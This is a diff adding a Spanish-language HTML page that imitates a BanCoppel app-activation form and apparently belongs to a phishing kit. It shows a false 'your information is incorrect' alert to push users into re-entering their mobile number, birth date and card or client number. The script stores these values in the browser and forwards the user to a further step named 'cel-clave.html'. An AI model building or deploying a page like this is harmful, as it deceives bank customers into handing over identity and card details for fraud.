@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Error de ingreso</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      color: #333;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: auto;
+      padding: 20px;
+    }
+
+    .error-alert {
+      background-color: #ffcccc;
+      color: #c00;
+      padding: 15px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      font-weight: bold;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .steps {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 20px 0;
+    }
+
+    .step-circle {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: #0053ba;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .line {
+      flex: 1;
+      height: 2px;
+      background-color: #ccc;
+      margin: 0 8px;
+    }
+
+    .dot {
+      width: 12px;
+      height: 12px;
+      background-color: #ccc;
+      border-radius: 50%;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      position: relative;
+      margin-bottom: 25px;
+    }
+
+    .form-group input,
+    .form-group select {
+      width: 100%;
+      padding: 16px 12px 4px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      background: none;
+      outline: none;
+    }
+
+    .form-group label {
+      position: absolute;
+      left: 12px;
+      top: 14px;
+      font-size: 14px;
+      color: #777;
+      transition: 0.2s;
+      pointer-events: none;
+    }
+
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label,
+    .form-group select:focus + label,
+    .form-group select:not([value=""]) + label {
+      top: -8px;
+      left: 10px;
+      background: white;
+      padding: 0 5px;
+      font-size: 12px;
+      color: #0053ba;
+    }
+
+    .info-text {
+      font-size: 12px;
+      color: #007bff;
+      margin-bottom: 5px;
+      margin-top: -10px;
+    }
+
+    .checkbox-group {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      margin-bottom: 25px;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+
+    .checkbox-container input {
+      margin-right: 10px;
+    }
+
+    .checkbox-container label a {
+      color: #0053ba;
+      text-decoration: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background-color: #ccc;
+      color: #444;
+      font-weight: bold;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      cursor: not-allowed;
+    }
+
+    .btn.enabled {
+      background-color: #0053ba;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    .footer-link {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 20px;
+    }
+
+    .footer-link a {
+      color: #0053ba;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="steps">
+    <div class="step-circle">1</div>
+    <div class="line"></div>
+    <div class="dot"></div>
+    <div class="line"></div>
+    <div class="dot"></div>
+  </div>
+
+  <div class="error-alert">
+    Información del usuario es incorrecta.<br>
+    Por favor ingrese sus datos nuevamente y correctamente.
+  </div>
+
+  <h2>Tu registro</h2>
+
+  <form id="registroForm">
+    <div class="form-group">
+      <input type="text" id="celular" maxlength="10" pattern="[0-9]*" required placeholder=" " />
+      <label for="celular">¿Cuál es tu número de celular?</label>
+    </div>
+
+    <div class="form-group">
+      <input type="date" id="fechaNacimiento" required min="1930-12-30" max="2006-12-30" placeholder=" " />
+      <label for="fechaNacimiento">¿Cuál es tu fecha de nacimiento?</label>
+    </div>
+
+    <div class="form-group">
+      <select id="tipoIdentificacion" required>
+        <option value="" disabled selected></option>
+        <option value="tarjeta">Número de Tarjeta BanCoppel</option>
+        <option value="cliente">Número de Cliente BanCoppel</option>
+      </select>
+      <label for="tipoIdentificacion">Activa tu app con:</label>
+    </div>
+
+    <div class="info-text" id="labelIdentificador">Número de tarjeta</div>
+
+    <div class="form-group">
+      <input type="text" id="numeroIdentificador" maxlength="16" pattern="[0-9]*" required placeholder=" " />
+      <label for="numeroIdentificador" id="inputPlaceholder">Ingresa tu número de tarjeta</label>
+    </div>
+
+    <div class="checkbox-group">
+      <div class="checkbox-container">
+        <input type="checkbox" id="terminos">
+        <label for="terminos">Acepto los <a href="#">Términos y Condiciones de Uso</a></label>
+      </div>
+
+      <div class="checkbox-container">
+        <input type="checkbox" id="privacidad">
+        <label for="privacidad">Leí el <a href="#">Aviso de Privacidad</a></label>
+      </div>
+    </div>
+
+    <button type="submit" class="btn" id="continuarBtn" disabled>Continuar</button>
+  </form>
+
+  <div class="footer-link">
+    <a href="#">En otro momento</a>
+  </div>
+</div>
+
+<script>
+  const celular = document.getElementById("celular");
+  const fechaNacimiento = document.getElementById("fechaNacimiento");
+  const tipoIdentificacion = document.getElementById("tipoIdentificacion");
+  const numeroIdentificador = document.getElementById("numeroIdentificador");
+  const inputPlaceholder = document.getElementById("inputPlaceholder");
+  const labelIdentificador = document.getElementById("labelIdentificador");
+  const terminos = document.getElementById("terminos");
+  const privacidad = document.getElementById("privacidad");
+  const continuarBtn = document.getElementById("continuarBtn");
+  const form = document.getElementById("registroForm");
+
+  tipoIdentificacion.addEventListener("change", () => {
+    if (tipoIdentificacion.value === "cliente") {
+      labelIdentificador.innerText = "Número de cliente";
+      inputPlaceholder.innerText = "Ingresa tu número de cliente BanCoppel";
+    } else {
+      labelIdentificador.innerText = "Número de tarjeta";
+      inputPlaceholder.innerText = "Ingresa tu número de tarjeta";
+    }
+  });
+
+  function validarFormulario() {
+    const camposLlenos = celular.value.length === 10 &&
+                         fechaNacimiento.value &&
+                         tipoIdentificacion.value &&
+                         numeroIdentificador.value.length >= 8 &&
+                         terminos.checked &&
+                         privacidad.checked;
+
+    continuarBtn.disabled = !camposLlenos;
+    continuarBtn.classList.toggle("enabled", camposLlenos);
+  }
+
+  form.addEventListener("input", validarFormulario);
+
+  form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    const datos = {
+      celular: celular.value.trim(),
+      nacimiento: fechaNacimiento.value,
+      tipo: tipoIdentificacion.value,
+      identificador: numeroIdentificador.value.trim()
+    };
+
+    localStorage.setItem("bancoldata", JSON.stringify(datos));
+    window.location.href = "cel-clave.html";
+  });
+</script>
+
+</body>
+</html>
